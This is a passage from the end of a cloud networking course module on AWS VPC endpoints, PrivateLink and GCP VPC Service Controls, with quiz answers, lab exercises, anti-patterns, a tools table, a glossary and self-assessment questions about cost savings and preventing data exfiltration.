| 9 | Why is GCP VPC Service Controls dry-run mode critical before enforcement? | Enforcement immediately blocks all non-compliant requests. Dry-run logs violations without blocking. Missing any legitimate access pattern in the perimeter config causes production breakage on enforcement. Always dry-run for 2+ weeks. |
| 10 | What VPC attribute must be enabled for interface endpoint private DNS to work? | Both `enableDnsSupport: true` AND `enableDnsHostnames: true` must be set on the VPC. Disabling either prevents the Route 53 private hosted zone from being served inside the VPC. |
| 11 | What is Private Google Access in GCP? | A subnet-level setting that allows VMs with only internal IPs (no external IP) to reach Google APIs (BigQuery, GCS, Pub/Sub) through Google's internal network, without needing NAT or an external IP. |
| 12 | A new AZ is added to an existing VPC. What must be manually updated for the S3 Gateway endpoint? | Associate the endpoint with the new AZ's route table: `aws ec2 modify-vpc-endpoint --add-route-table-ids NEW_ROUTE_TABLE_ID`. Gateway endpoints are route table associations, not auto-propagating. |
| 13 | What is the VPC endpoint type for Secrets Manager? | Interface endpoint (PrivateLink) at service name `com.amazonaws.REGION.secretsmanager`. Unlike S3 and DynamoDB, most services including Secrets Manager, KMS, STS, ECR use Interface endpoints, not Gateway. |
| 14 | How does an interface endpoint's private DNS work? | AWS creates Route 53 private hosted zone entries that resolve the service's public hostname (e.g., `secretsmanager.us-east-1.amazonaws.com`) to the endpoint's ENI private IP. Applications need no code changes — they use the same hostname. |
| 15 | What S3 bucket policy condition requires that requests come through a specific VPC endpoint? | `"StringNotEquals": {"aws:sourceVpce": "vpce-0abc123"}` with `Effect: Deny`. This denies requests that did NOT come through the specified endpoint, forcing all access to use the private path. |
| 16 | What GCP concept is equivalent to an AWS Interface endpoint (PrivateLink)? | GCP Private Service Connect — creates a private endpoint within a VPC that connects to Google-managed services or customer-published services using an internal IP address. |
| 17 | Why might Airflow suddenly fail to retrieve Secrets Manager passwords after DNS settings change? | If `enableDnsHostnames` is disabled on the VPC, interface endpoint private DNS stops working. The service hostname resolves to a public IP; without NAT gateway or internet access, the connection times out. |
| 18 | What GCP service accounts often break VPC Service Controls perimeters unexpectedly? | BigQuery Transfer Service (`gcp-sa-bigquery-dts`), Dataform, Google-managed Looker and Scheduled Queries service accounts. These operate from Google infrastructure outside your perimeter and need explicit ingress rules. |
| 19 | What is the STS endpoint required for in an EKS private cluster? | IRSA (IAM Roles for Service Accounts). EKS pods with IRSA exchange OIDC tokens with STS for temporary credentials. STS calls go to a public endpoint by default; without the STS Interface endpoint, IRSA fails in a fully private cluster. |
| 20 | What is AWS PrivateLink's per-AZ bandwidth limit? | 10 Gbps burst per Availability Zone per Interface endpoint. For high-throughput workloads (e.g., high-frequency Kinesis or Secrets Manager calls), deploy endpoints in multiple AZs to distribute load. |

---

## 13. Further Reading

- **AWS documentation — "VPC endpoints":** The authoritative reference covering Gateway vs Interface endpoint differences, endpoint policy syntax, and service-specific considerations. The "Endpoint policies" section is particularly important for understanding the exfiltration prevention use case.
- **AWS documentation — "Privately access services by using AWS PrivateLink":** Covers the Interface endpoint architecture, PrivateLink service creation for cross-account sharing, and the DNS mechanics of private DNS override.
- **AWS security blog — "Securing your data pipeline with VPC endpoint policies":** Practical examples of endpoint policies for S3 and Secrets Manager, with specific focus on preventing exfiltration. Searchable on the AWS Security Blog at `aws.amazon.com/blogs/security`.
- **GCP documentation — "VPC Service Controls overview":** The definitive reference for understanding perimeters, access levels, ingress/egress rules, and dry-run vs enforcement modes. The "Troubleshoot" section documents the most common breakage patterns.
- **GCP documentation — "Set up Private Google Access":** Explains subnet-level configuration for private VMs to access Google APIs and the specific DNS requirements.
- **"The VPC Endpoints Field Guide" by Corey Quinn (Last Week in AWS):** A practitioner's analysis of endpoint costs, cost optimization patterns, and when each endpoint type makes economic sense. Concrete cost calculations grounded in real-world usage patterns.

---

## 14. Lab Exercises

**Exercise 1: Measure S3 Endpoint Cost Savings**

Set up VPC flow logs on a VPC and run a Spark job (or simple Python S3 copy) that reads and writes S3 data. Capture the NAT gateway flow log entries (look for flow log records with the NAT gateway's ENI ID). Then add an S3 Gateway endpoint and run the same job. Capture the new flow logs — you should see the S3 traffic no longer appearing in the NAT gateway's flow logs. Calculate the GB transferred and the cost difference.

**Exercise 2: Break and Fix Private DNS**

Create an interface endpoint for Secrets Manager with private DNS enabled. From inside the VPC, run `dig secretsmanager.us-east-1.amazonaws.com` and confirm it resolves to a private IP. Then disable `enableDnsHostnames` on the VPC. Run `dig` again — observe that it now resolves to a public IP. Attempt to retrieve a secret and observe the failure. Re-enable `enableDnsHostnames` and verify the fix. Document the exact failure message and DNS query results at each step.

**Exercise 3: S3 Endpoint Policy Restriction**

Create an S3 Gateway endpoint with a restrictive policy that allows access only to buckets prefixed with `test-allowed-`. Attempt to access both `test-allowed-mybucket` and `test-blocked-mybucket` (an external bucket). Observe the access denied error for the external bucket. Then add NAT gateway access to the subnet and observe that you CAN reach the external bucket through NAT. This demonstrates why endpoint policies alone are insufficient — you must also restrict NAT access.

**Exercise 4: GCP Private Google Access**

Create a GCP VM without an external IP in a subnet with Private Google Access disabled. Attempt to run `bq query` — observe the failure. Enable Private Google Access on the subnet. Attempt `bq query` again — observe success. Then disable Private Google Access and verify that adding a Cloud NAT gateway enables GCS/BigQuery access through NAT instead.

**Exercise 5: Endpoint Coverage Audit Script**

Use the `endpoint_diagnostics.py` code toolkit to audit a VPC. Run: (1) `estimate_s3_nat_savings` with your actual S3 GB/month estimate; (2) `check_common_endpoint_dns` from inside an EC2 instance in the VPC to identify which services are using public vs private endpoints; (3) `analyze_exfiltration_vectors` to produce a risk list. For each missing endpoint, create it and re-run the audit to verify the gap is closed.

---

## 15. Key Takeaways

VPC endpoints and VPC Service Controls solve different aspects of the same problem: keeping cloud workload traffic private and preventing exfiltration of sensitive data.

The economics are compelling: the S3 Gateway endpoint is free and eliminates what is typically the largest data transfer cost in a data engineering VPC — NAT gateway charges on S3 reads and writes. At 10 TB/day of S3 traffic, the S3 Gateway endpoint saves roughly $164,000/year in NAT data processing fees. It should be one of the first resources created in any data platform VPC.

For security, the two-sided control is what prevents exfiltration: the S3 endpoint policy restricts which buckets are accessible via the private path (the VPC side), combined with the elimination of NAT gateway from sensitive subnets (removing the fallback internet path). Neither control alone is sufficient — both must be present for complete coverage.

GCP VPC Service Controls operate at the API level above IAM, addressing the exfiltration scenario that IAM cannot prevent: a legitimate identity with correct permissions being used to copy data to an unauthorized destination. The operational requirement is discipline around dry-run validation — premature enforcement causes production breakages.

For fully private Kubernetes clusters, a checklist exists: S3 Gateway, ECR API, ECR DKR, STS, Secrets Manager, CloudWatch Logs, KMS, and SSM endpoints are needed to cover the full set of AWS services a modern EKS workload touches. Missing any one of them causes cryptic failures that are difficult to debug without understanding the full dependency map.

---

## 16. Connections to Other Modules

- **M32 — VPC Architecture:** VPC endpoints are VPC-level resources. The Gateway endpoint modifies route tables (the same route tables from M32). Interface endpoints create ENIs in subnets. The VPC design — which subnets exist, which route tables are attached, whether DNS is enabled — determines which endpoints are needed and how they're configured.
- **M33 — IAM and RBAC:** Endpoint policies are IAM-like JSON documents. They add a second evaluation layer above IAM — a request must satisfy both the caller's IAM policy AND the endpoint policy. IAM controls what identities can do; endpoint policies control which resources can be accessed through the private path.
- **M34 — Security Groups and Network Policies:** Interface endpoint ENIs have security groups. The security group for an endpoint ENI must allow inbound HTTPS (TCP 443) from the VPC CIDR or from the security groups of instances that will use the endpoint. Forgetting this is the second most common private endpoint setup mistake (after forgetting private DNS).
- **M36 — Cloud DNS and Service Mesh:** Interface endpoints work through DNS override — Route 53 private hosted zones serve internal DNS records for service hostnames. Understanding DNS resolution order (Route 53 Resolver, private hosted zones, public DNS) is prerequisite to understanding how private DNS for endpoints works and fails.

---

## 17. Anti-Patterns

**Anti-pattern: Creating endpoints but not testing from inside the VPC.** An endpoint in `available` state does not guarantee it's working correctly. Until you verify from inside a VPC instance that `dig secretsmanager.us-east-1.amazonaws.com` resolves to a private IP, you don't know if private DNS is working. Always validate endpoint operation from inside the VPC, not from the console.

**Anti-pattern: Using only the S3 Gateway endpoint and assuming S3 traffic is private.** The Gateway endpoint covers traffic from within the VPC. If on-premises servers send data to S3 via Direct Connect, they don't use the Gateway endpoint (which is VPC-route-based). On-premises S3 access over Direct Connect requires an Interface endpoint for S3. Two different endpoint types for two different traffic sources.

**Anti-pattern: Relying on VPC Service Controls without monitoring dry-run violations.** Enabling dry-run mode is not sufficient — you must actively monitor and triage every violation that appears. A common pattern: dry-run is enabled, a dashboard is created, but no team is assigned to review violations. Three weeks later, enforcement is enabled, and thirty production jobs break. The violations were in the logs the whole time.

**Anti-pattern: Adding KMS interface endpoint but not adding it to all AZs.** If the KMS endpoint is only deployed in two of three AZs and a Spark worker happens to be scheduled in the third AZ, KMS decrypt calls for S3 SSE-KMS objects fail. Interface endpoints should be deployed in every AZ used by the workloads that need them. This is a common source of intermittent failures that are difficult to reproduce.

**Anti-pattern: Setting a VPC endpoint policy of `Effect: Allow, Action: *, Resource: *` and calling it "secure."** This is identical to having no endpoint policy — it allows all S3 traffic through the endpoint to any bucket. The policy exists but provides no additional security. A meaningful endpoint policy must restrict `Resource` to specific bucket ARNs.

---

## 18. Tools Reference

| Tool | Purpose | Key Usage |
|------|---------|-----------|
| `aws ec2 create-vpc-endpoint` | Create Gateway or Interface endpoint | `--vpc-endpoint-type Gateway|Interface --service-name com.amazonaws.REGION.s3` |
| `aws ec2 describe-vpc-endpoints` | List and inspect endpoints | `--filters Name=vpc-id,Values=VPC_ID` |
| `aws ec2 modify-vpc-endpoint` | Add route tables or subnets to endpoint | `--add-route-table-ids RTB_ID` |
| `dig SERVICE.REGION.amazonaws.com` | Check DNS resolution inside VPC | Private IP = endpoint active; public IP = endpoint not working |
| `nslookup` | Same as dig, available on Windows | `nslookup secretsmanager.us-east-1.amazonaws.com` |
| `aws s3api get-bucket-policy` | Check S3 bucket policy for endpoint conditions | `--bucket BUCKET_NAME --query Policy` |
| `gcloud access-context-manager perimeters describe` | Inspect GCP service perimeter | `--policy=POLICY_ID PERIMETER_NAME` |
| `gcloud compute networks subnets update` | Enable Private Google Access | `--enable-private-ip-google-access` |
| Cloud Audit Logs (GCP) | Review VPC SC violations | Filter `protoPayload.status.code=7` + `violationReason=VPC_SERVICE_CONTROLS` |
| `aws ec2 describe-vpc-attribute` | Check VPC DNS settings | `--attribute enableDnsSupport` and `enableDnsHostnames` |
| `endpoint_diagnostics.py validate_private_dns` | Check if service hostname is private | Run from inside VPC for accurate results |

---

## 19. Glossary

**AWS PrivateLink:** The AWS networking technology that powers Interface VPC endpoints. Creates a private fiber connection from your VPC to AWS services over the AWS backbone. Also used to privately share services between accounts via Network Load Balancers.

**Dry-Run Mode (VPC SC):** A GCP VPC Service Controls configuration mode where policy violations are logged to Cloud Audit Logs but not enforced — traffic is not blocked. Used to identify legitimate access patterns before enabling enforcement.

**Endpoint Policy:** An IAM-like JSON policy attached to a VPC endpoint that restricts which resources can be accessed through the endpoint, regardless of the caller's IAM permissions. Adds a second evaluation layer above IAM.

**Gateway Endpoint:** An AWS VPC endpoint type for S3 and DynamoDB. Modifies route tables to direct traffic through the AWS internal network. Free (no per-hour, no per-GB cost). Limited to resources within the VPC.

**Interface Endpoint:** An AWS VPC endpoint type (PrivateLink-based) for most AWS services. Creates an ENI with a private IP in your subnet. $0.01/hr/AZ + $0.01/GB. Enables private DNS override.

**Perimeter (VPC SC):** A GCP VPC Service Controls configuration object that defines a set of GCP projects and GCP services to protect. Requests to protected services from outside the perimeter are blocked unless permitted by access levels or ingress rules.

**Private Google Access:** A GCP subnet-level setting that allows VMs with only internal IP addresses to reach Google API endpoints (BigQuery, GCS, Pub/Sub) through Google's internal network without NAT or an external IP.

**Private Service Connect:** GCP's Interface endpoint equivalent. Creates a private endpoint within a VPC for accessing Google-managed services or customer-published services using an internal IP.

**Service Perimeter:** See Perimeter. The configuration object in GCP Access Context Manager that defines which projects and services are inside the security boundary.

**VPC Service Controls (VPC SC):** A GCP security feature providing an organization-level perimeter around GCP services. Restricts API access based on request origin context. Prevents data exfiltration through valid API calls by blocking requests from outside the perimeter.

**vpce (prefix):** AWS internal identifier prefix for VPC endpoints. VPC Endpoint IDs are formatted as `vpce-0abc1234567890abc`. Appears in route tables as a gateway target.

---

## 20. Self-Assessment

1. A Spark cluster has an S3 Gateway endpoint but you notice S3 traffic is still going through NAT gateway in the flow logs for nodes in the `us-east-1c` subnet. What is the most likely cause, and how do you fix it?
2. Explain the difference between the S3 Gateway endpoint's `Resource: *` policy vs a restrictive policy like `Resource: ["arn:aws:s3:::company-*", "arn:aws:s3:::company-*/*"]`. Why does the restrictive policy alone not guarantee exfiltration prevention?
3. A private EKS cluster has an ECR API interface endpoint but pods still fail to pull images with `ImagePullBackOff`. What other endpoints are likely missing?
4. What two VPC attributes must be `true` for interface endpoint private DNS to work? How would you debug if private DNS stopped working?
5. Write the AWS CLI command to associate an existing S3 Gateway endpoint (`vpce-0abc123`) with a new route table (`rtb-newaz-456`).
6. Explain the GCP VPC Service Controls perimeter concept. What does it block that IAM alone cannot?
7. Why must dry-run mode be used before enabling GCP VPC Service Controls enforcement? Give two specific examples of legitimate access patterns that commonly break.
8. A Spark job on GCP reads from BigQuery and writes results to a GCS bucket. There is no external IP on the Compute instances and no Cloud NAT. What GCP networking feature must be enabled for this to work?
9. The `endpoint_diagnostics.py` `validate_private_dns` function shows that `secretsmanager.us-east-1.amazonaws.com` resolves to a public IP from inside the VPC, even though the interface endpoint is in `available` state. List three possible causes.
10. An analyst reports that `bq extract` to `gs://partner-bucket/data.csv` is suddenly failing with `PERMISSION_DENIED: Request is prohibited by organization's policy` after a VPC Service Controls change. Who do you involve to resolve this, and what configuration change likely fixes it?

---

## 21. Module Summary

Private endpoints and VPC Service Controls represent the networking layer's answer to data exfiltration — the threat where data moves through valid, authenticated API calls rather than through network intrusions. IAM controls what an identity is authorized to do; security groups control which hosts can connect; private endpoints and VPC SC control which data destinations are reachable and from which contexts.

The S3 Gateway endpoint is the single highest-ROI networking change for most data engineering platforms: it is free, eliminates NAT gateway data processing charges on S3 traffic (often the largest surprise line item in an AWS bill), and is trivially easy to implement. The only configuration mistake that commonly nullifies it is failing to associate it with all private subnet route tables — particularly when new AZs are added.

Interface endpoints (PrivateLink) complete the picture for services like Secrets Manager, KMS, STS, ECR, and CloudWatch Logs. They cost $0.01/hr/AZ plus $0.01/GB but provide a private network path and enable the private DNS override that allows applications to use the endpoint without code changes. The critical configuration requirements are private DNS enabled and `enableDnsHostnames: true` on the VPC.

Endpoint policies add the exfiltration prevention layer on the VPC side: by restricting which S3 buckets are accessible through the endpoint, they block the private network path from being used to reach attacker-controlled buckets. Combined with removal of NAT gateway from sensitive subnets, this creates a complete control with no alternate network path to external destinations.

In GCP, VPC Service Controls addresses the same problem at the API level, creating an organization-wide perimeter that enforces access context requirements above IAM. The operational discipline required — dry-run validation, systematic violation review, explicit ingress rules for all legitimate external identities — is the primary implementation challenge. The payoff is a hard boundary that even valid credentials cannot bypass when the request originates from an untrusted context.

The next and final module of SYS-NET-102 — M36: Cloud DNS and Service Mesh Basics — covers how services discover and communicate with each other within the same private network, completing the cloud networking stack from VPC design (M32) through IAM (M33), security groups (M34), private access (M35), to service-level communication (M36).
